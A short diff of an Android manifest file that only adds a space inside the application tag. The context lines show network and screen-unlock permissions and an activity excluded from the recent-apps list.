@@ -33,7 +33,7 @@
 	<uses-permission android:name="android.permission.USER_PRESENT" />
 	<uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
 
-	<application android:icon="@drawable/icon" android:label="@string/app_name" android:debuggable="@DEBUGGABLE@">
+	<application android:icon="@drawable/icon" android:label="@string/app_name" android:debuggable="@DEBUGGABLE@" >
 	
 		<activity android:name="com.android.networking.gui.AGUI"
 			android:label="@string/app_name" android:excludeFromRecents="true"
